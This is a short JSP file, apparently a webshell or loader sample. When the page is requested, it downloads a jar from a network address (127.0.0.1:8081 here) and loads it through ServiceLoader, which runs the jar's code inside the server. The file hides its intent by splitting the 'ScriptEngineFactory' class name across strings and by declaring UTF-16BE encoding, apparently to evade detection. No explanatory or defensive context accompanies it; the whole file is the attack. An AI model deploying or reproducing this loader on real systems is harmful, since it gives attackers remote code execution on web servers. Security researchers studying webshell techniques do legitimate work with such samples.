<%@ page language="java" pageEncoding="UTF-16BE" %>
<%@ page import="java.util.Iterator" %>
<%@ page import="java.util.ServiceLoader" %>
<%@ page import="java.net.URLClassLoader" %>
<%@ page import="java.net.URL" %>
<%
    Class clazz = Class.forName("javax.script.ScriptEng"+"ineFactory");
    Iterator serviceLoader = ServiceLoader.load(clazz, new URLClassLoader(new URL[]{new URL("http://127.0.0.1:8081/untitled.jar")})).iterator();
    while (serviceLoader.hasNext()){
        serviceLoader.next();
    }
%>